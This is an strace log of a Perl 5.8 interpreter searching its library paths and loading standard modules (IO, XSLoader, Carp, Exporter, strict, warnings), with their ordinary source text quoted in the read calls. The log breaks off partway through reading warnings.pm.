5839  07:10:58.113246 stat64("/usr/local/share/perl/5.8.4", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113258 stat64("/usr/local/lib/perl/5.8.3", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113269 stat64("/usr/local/share/perl/5.8.3", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113280 stat64("/usr/local/lib/perl/5.8.2", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113292 stat64("/usr/local/share/perl/5.8.2", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113303 stat64("/usr/local/lib/perl/5.8.1", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113314 stat64("/usr/local/share/perl/5.8.1", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113326 stat64("/usr/local/lib/perl/5.8.0", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113337 stat64("/usr/local/share/perl/5.8.0", 0xbfe61910) = -1 ENOENT (No such file or directory)
5839  07:10:58.113361 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe61608) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.113374 _llseek(0, 0, [0], SEEK_CUR) = 0
5839  07:10:58.113386 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe61608) = -1 EBADF (Bad file descriptor)
5839  07:10:58.113396 _llseek(1, 0, 0xbfe61650, SEEK_CUR) = -1 EBADF (Bad file descriptor)
5839  07:10:58.113406 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe61608) = -1 EINVAL (Invalid argument)
5839  07:10:58.113417 _llseek(2, 0, 0xbfe61650, SEEK_CUR) = -1 ESPIPE (Illegal seek)
5839  07:10:58.113427 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
5839  07:10:58.113439 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe616c8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.113449 _llseek(1, 0, [0], SEEK_CUR) = 0
5839  07:10:58.113460 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
5839  07:10:58.113471 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
5839  07:10:58.113489 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
5839  07:10:58.113577 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
5839  07:10:58.113637 getppid()         = 5837
5839  07:10:58.113696 stat64("/etc/perl/IO.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113710 stat64("/etc/perl/IO.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113723 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113738 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113752 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113764 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113777 stat64("/usr/lib/perl5/IO.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113789 stat64("/usr/lib/perl5/IO.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113802 stat64("/usr/share/perl5/IO.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113814 stat64("/usr/share/perl5/IO.pm", 0xbfe612cc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113827 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfe613bc) = -1 ENOENT (No such file or directory)
5839  07:10:58.113839 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
5839  07:10:58.113859 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
5839  07:10:58.113873 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe610d8) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.113884 _llseek(6, 0, [0], SEEK_CUR) = 0
5839  07:10:58.113906 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
5839  07:10:58.113961 stat64("/etc/perl/XSLoader.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.113974 stat64("/etc/perl/XSLoader.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.113988 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114000 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114054 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114082 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114096 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114108 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114121 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114133 stat64("/usr/share/perl5/XSLoader.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114147 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.114159 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
5839  07:10:58.114181 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.114208 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.114219 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.114239 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
5839  07:10:58.114472 brk(0x8195000)    = 0x8195000
5839  07:10:58.114842 _llseek(8, 3407, [3407], SEEK_SET) = 0
5839  07:10:58.119779 _llseek(8, 0, [3407], SEEK_CUR) = 0
5839  07:10:58.119780 close(8)          = 0
5839  07:10:58.119780 stat64("/etc/perl/Carp.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119780 stat64("/etc/perl/Carp.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119780 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119781 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119781 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119781 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119781 stat64("/usr/lib/perl5/Carp.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119781 stat64("/usr/lib/perl5/Carp.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119782 stat64("/usr/share/perl5/Carp.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119782 stat64("/usr/share/perl5/Carp.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119782 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119788 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119802 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.119815 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
5839  07:10:58.119836 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.119850 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.119862 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.119879 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
5839  07:10:58.120377 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
5839  07:10:58.120445 read(8, "", 4096) = 0
5839  07:10:58.120458 close(8)          = 0
5839  07:10:58.120514 stat64("/etc/perl/Exporter.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120527 stat64("/etc/perl/Exporter.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120541 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120553 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120567 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120580 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120594 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120605 stat64("/usr/lib/perl5/Exporter.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120618 stat64("/usr/share/perl5/Exporter.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120630 stat64("/usr/share/perl5/Exporter.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120643 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120655 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120669 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.120681 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
5839  07:10:58.120702 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.120716 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.120728 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.120744 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
5839  07:10:58.121274 _llseek(8, 2217, [2217], SEEK_SET) = 0
5839  07:10:58.121291 _llseek(8, 0, [2217], SEEK_CUR) = 0
5839  07:10:58.121302 close(8)          = 0
5839  07:10:58.121374 stat64("/etc/perl/strict.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121404 stat64("/etc/perl/strict.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121445 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121459 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121489 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121501 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121515 stat64("/usr/lib/perl5/strict.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121527 stat64("/usr/lib/perl5/strict.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121540 stat64("/usr/share/perl5/strict.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121551 stat64("/usr/share/perl5/strict.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121564 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121577 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121590 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121602 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
5839  07:10:58.121623 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.121638 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.121649 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.121668 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
5839  07:10:58.121810 _llseek(8, 598, [598], SEEK_SET) = 0
5839  07:10:58.121824 _llseek(8, 0, [598], SEEK_CUR) = 0
5839  07:10:58.121834 close(8)          = 0
5839  07:10:58.121871 stat64("/etc/perl/warnings.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121899 stat64("/etc/perl/warnings.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121941 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121954 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121985 stat64("/usr/local/share/perl/5.8.8/warnings.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.121997 stat64("/usr/local/share/perl/5.8.8/warnings.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.122011 stat64("/usr/lib/perl5/warnings.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.122023 stat64("/usr/lib/perl5/warnings.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.122036 stat64("/usr/share/perl5/warnings.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.122047 stat64("/usr/share/perl5/warnings.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.122061 stat64("/usr/lib/perl/5.8/warnings.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.122073 stat64("/usr/lib/perl/5.8/warnings.pm", 0xbfe60e1c) = -1 ENOENT (No such file or directory)
5839  07:10:58.122086 stat64("/usr/share/perl/5.8/warnings.pmc", 0xbfe60f0c) = -1 ENOENT (No such file or directory)
5839  07:10:58.122099 stat64("/usr/share/perl/5.8/warnings.pm", {st_mode=S_IFREG|0644, st_size=13018, ...}) = 0
5839  07:10:58.122120 open("/usr/share/perl/5.8/warnings.pm", O_RDONLY|O_LARGEFILE) = 8
5839  07:10:58.122134 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfe60c28) = -1 ENOTTY (Inappropriate ioctl for device)
5839  07:10:58.122145 _llseek(8, 0, [0], SEEK_CUR) = 0
5839  07:10:58.122163 read(8, "# -*- buffer-read-only: t -*-\n# !!!!!!!   DO NOT EDIT THIS FILE   !!!!!!!\n# This file was created by warnings.pl\n# Any changes made here will be lost.\n#\n\npackage warnings;\n\nour $VERSION = \'1.05\';\n\nuse Carp ();\n\nour %Offsets = (\n\n    # Warnings Categories added in Perl 5.008\n\n    \'all\'\t\t=> 0,\n    \'closure\'\t\t=> 2,\n    \'deprecated\'\t=> 4,\n    \'exiting\'\t\t=> 6,\n    \'glob\'\t\t=> 8,\n    \'io\'\t\t=> 10,\n    \'closed\'\t\t=> 12,\n    \'exec\'\t\t=> 14,\n    \'layer\'\t\t=> 16,\n    \'newline\'\t\t=> 18,\n    \'pipe\'\t\t=> 20,\n    \'unopened\'\t\t=> 22,\n    \'misc\'\t\t=> 24,\n    \'numeric\'\t\t=> 26,\n    \'once\'\t\t=> 28,\n    \'overflow\'\t\t=> 30,\n    \'pack\'\t\t=> 32,\n    \'portable\'\t\t=> 34,\n    \'recursion\'\t\t=> 36,\n    \'redefine\'\t\t=> 38,\n    \'regexp\'\t\t=> 40,\n    \'severe\'\t\t=> 42,\n    \'debugging\'\t\t=> 44,\n    \'inplace\'\t\t=> 46,\n    \'internal\'\t\t=> 48,\n    \'malloc\'\t\t=> 50,\n    \'signal\'\t\t=> 52,\n    \'substr\'\t\t=> 54,\n    \'syntax\'\t\t=> 56,\n    \'ambiguous\'\t\t=> 58,\n    \'bareword\'\t\t=> 60,\n    \'digit\'\t\t=> 62,\n    \'parenthesis\'\t=> 64,\n    \'precedence\'\t=> 66,\n    \'printf\'\t\t=> 68,\n    \'prototype\'\t\t=> 70,\n    \'qw\'\t\t=> 72,\n    \'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> 